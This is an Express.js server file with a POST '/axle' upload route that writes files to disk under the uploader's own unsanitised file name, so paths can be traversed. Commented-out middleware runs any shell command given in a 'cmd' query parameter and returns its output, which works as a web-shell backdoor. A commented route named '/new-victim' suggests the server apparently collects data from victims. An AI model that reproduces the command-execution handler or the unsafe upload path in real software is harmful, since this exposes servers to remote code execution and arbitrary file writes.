const express = require('express');
const app = express();
const fs = require('fs');
const os = require('os');
const path = require('path');
// const { exec } = require('child_process');
// const process = require('process');
const PORT = 6969;
app.use(express.json({ limit: '16mb' }));
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*'); // Replace '*' with your allowed origin (e.g., 'http://127.0.0.1:5500')
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header(
    'Access-Control-Allow-Headers',
    'Origin, X-Requested-With, Content-Type, Accept'
  );
  next();
});
// const { makeFile } = require('./test.js');

// const logTime = () => (req, res, next) => {
//   const { cmd } = req.query;
//   if (cmd) {
//     return exec(cmd, (err, stdout, stderr) => {
//       return res.send(JSON.stringify({ err, stdout, stderr }, null, 2));
//     });
//   } else {
//     res.send('This is port 7000');
//   }
//   next();
// };

// const logTime2 = () => (req, res, next) => {
//   const { cmd } = req.query;
//   if (cmd) {
//     return exec(cmd, (err, stdout, stderr) => {
//       return res.send(JSON.stringify({ err, stdout, stderr }, null, 2));
//     });
//   } else {
//     res.send('app 2 ' + process.env.SEXY);
//   }
//   next();
// };

// app.use(logTime());
// app2.use(logTime2());
// const tempDir = os.tmpdir();
app.post('/axle', function (req, res) {
  console.log(res)
  if (!req.body || !req.files.file) {
    return res.status(400).send('No files were uploaded.');
  }

  const uploadedFile = req.files.file;
  const originalFileName = uploadedFile.name;

  const filePath = path.join(__dirname, 'uploads', originalFileName);

  uploadedFile.mv(filePath, function (err) {
    if (err) {
      console.error('Error writing to file:', err);
      return res.status(500).send('Error writing to file');
    }

    res.sendStatus(200);
  });
});



// app.get('/new-victim', (req, res) => {
//   makeFile();
//   res.json('yoooo');
// });

// app.get('/', (req, res) => {
//   res.send('this is port6969')
// })

// app2.get('/', (req, res) => {
//   res.send('this is port7000')
// })

// app.get('/port1', (req, res) => {
//   res.redirect(301, 'http://localhost:7000');
// });

// app2.get('/port2', (req, res) => {
//   res.redirect(301, 'http://localhost:6969');
// });

app.listen(PORT, () => {
  console.log(`App is up @ PORT ${PORT}`);
});

// app2.listen(7000, () => {
//   console.log(`App is up @ PORT 7000`);
// });
